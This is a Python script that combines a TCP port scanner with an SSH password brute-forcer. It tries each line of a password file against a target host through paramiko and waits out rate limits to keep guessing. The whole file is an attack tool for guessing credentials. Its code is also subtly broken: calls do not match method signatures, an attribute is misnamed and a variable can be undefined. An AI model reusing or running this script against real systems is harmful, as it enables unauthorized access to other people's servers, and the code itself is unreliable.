import socket
import argparse
import textwrap
import paramiko
import time
from colorama import init, Fore

# Initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

ssh_open = False


class TcpScanner:
    def __init__(self, host):
        self.host = host

    def create_range(self, start_port, end_port):
        """
        Create a range from the start port and the end port values passed as input
        :param start_port: (int) first or single port in the range
        :param end_port: (int) last port in the range
        :return: Range
        """
        try:
            if start_port <= end_port:
                return range(start_port, end_port + 1)
        except ValueError:
            pass
        raise argparse.ArgumentTypeError('Invalid port values format')

    def scan_range(self, start_port, end_port):
        """
        Scan a range of ports
        :param start_port: (int) first or single port in the range
        :param end_port: (int) last port in the range
        :param host: (str) host to scan
        :return: None
        """
        ports = self.create_range(start_port, end_port)
        for port in ports:
            self.scan_port(self.host, port)

    def scan_port(self, port):
        """
        Scan a single port
        :param port: (int) port to scan
        :param host: (str) host to scan
        :return: None
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # setting the timeout to 0.3 seconds
            sock.settimeout(0.3)
            result = sock.connect_ex((self.host, port))
            if result == 0:
                if port == 22:
                    global ssh_open
                    ssh_open = True
                print(f"The port {port} is open")
            else:
                pass
        except OSError as e:
            print(f"Connection Error: {e}")
        finally:
            # Closing the socket
            sock.close()


class BruteForcer:
    def __init__(self, host, passfile, target_port = 22):
        self.scanner = host
        self.passfile = passfile
        self.target_port = target_port

    def brute_ssh(self, username, password):
        """
        :param username: (str) username to use to connect
        :param password: (str) password to use to connect
        :return: None
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=self.host, username=username, password=password, timeout=1)
        except socket.timeout:
            print(f"{RED}[!] Host: {self.host} is unreachable. {RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"[!] Invalid Credentials for{username}:{password}")
            return False
        except paramiko.SSHException:
            print(f"{BLUE} [*] Quota exceeded,retrying after 1 minute... {RESET}")
            time.sleep(60)
            return self.brute_ssh(username, password)
        else:
            print(f"{GREEN} [+] Found Combo:{username}:{password} {RESET}")
            return True

    def brute_port(self, username, password):
        """
        This is a general function to brute the target port, it has implementation for only SSH now
        :param username: (str) username to use to connect
        :param password: (str) password to use to connect
        :return: None
        """
        if self.target_port == 22 and ssh_open:
            self.brute_ssh(username, password)
        else:
            print(f"We are sorry, the port {self.target_port} is not yet available for the bruteforce.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='TCP portScanning tool',
                                     formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
            '''Example: python3 ssh_scanner_brute.py -H 192.168.250.12 -sp 20 -ep 90 -tp 22 -P passfile.txt -u kali
            python3 adv_port_scanner.py -H 192.168.250.12 -sp 80 -P passfile.txt -u kali
            '''))
    parser.add_argument('-sp', '--start_port', type=int, help="first or single port in the range")
    parser.add_argument('-ep', '--end_port', type=int, help="last port in the range")
    parser.add_argument('-tp', '--target_port', type=int, help="a port to target for the bruteforce - 22 by default")
    parser.add_argument('-H', '--host', help="specified host")
    parser.add_argument("-P", "--passfile", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")
    args = parser.parse_args()
    scanner = TcpScanner(args.host)
    if args.end_port:
        scanner.scan_range(args.start_port, args.end_port)
        brute_forcer = BruteForcer(args.host, args.passfile, args.target_port)
    elif args.start_port:
        scanner.scan_port(args.start_port)
        brute_forcer = BruteForcer(args.host, args.passfile, args.target_port)

    with open(brute_forcer.passfile, "r") as p:
        for passwordAttempt in p:
            if brute_forcer.brute_port(brute_forcer.host, args.user, passwordAttempt):
                 break
